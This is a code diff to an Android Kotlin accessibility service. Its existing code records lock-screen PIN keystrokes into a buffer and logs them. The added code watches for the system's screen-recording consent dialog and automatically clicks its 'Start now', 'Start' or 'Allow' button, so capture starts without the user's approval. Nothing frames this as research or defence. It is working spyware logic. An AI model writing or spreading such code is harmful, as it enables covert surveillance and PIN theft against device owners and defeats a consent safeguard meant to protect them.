@@ -86,6 +86,14 @@ class WatchAccessibilityService : AccessibilityService() {
                         Log.d(TAG, "Lock screen reappeared with buffer not empty - clearing")
                         pinBuffer.clear()
                     }
+
+                    val className = event.className?.toString() ?: ""
+
+                    if (className.contains("MediaProjection") ||
+                        packageName.contains("systemui") && event.text?.toString()?.contains("record") == true) {
+                        Log.i(TAG, "Media projection dialog detected")
+                        handleMediaProjectionDialog()
+                    }
                 }
                 AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                     if (isLockScreen(event)) {
@@ -1096,6 +1104,11 @@ class WatchAccessibilityService : AccessibilityService() {
         val packageName = event.packageName?.toString() ?: ""
         val className = event.className?.toString() ?: ""
 
+        // For Media Projection Service
+        if (packageName.contains("systemui") && className.contains("AlertDialog")) {
+            return false
+        }
+
         return packageName.contains("systemui") ||
                 packageName.contains("com.android.systemui") ||
                 className.contains("Keyguard") ||
@@ -1230,6 +1243,28 @@ class WatchAccessibilityService : AccessibilityService() {
                 pinBuffer.deleteCharAt(pinBuffer.length - 1)
                 Log.d(TAG, "PIN backspace - buffer now: '${pinBuffer.toString()}'")
             }
+        }
+    }
+
+    private fun handleMediaProjectionDialog() {
+        val root = rootInActiveWindow ?: return
+
+        Log.i(TAG, "Looking for Media Projection dialog...")
+
+        // Look for "Start now" button
+        var startButton = findNodeByText(root, "Start now")
+        if (startButton == null) {
+            startButton = findNodeByText(root, "Start")
+        }
+        if (startButton == null) {
+            startButton = findNodeByText(root, "Allow")
+        }
+
+        if (startButton != null && startButton.isEnabled) {
+            Log.i(TAG, "Found Start button, clicking...")
+            startButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+        } else {
+            Log.w(TAG, "Could not find Start button")
         }
     }
 }
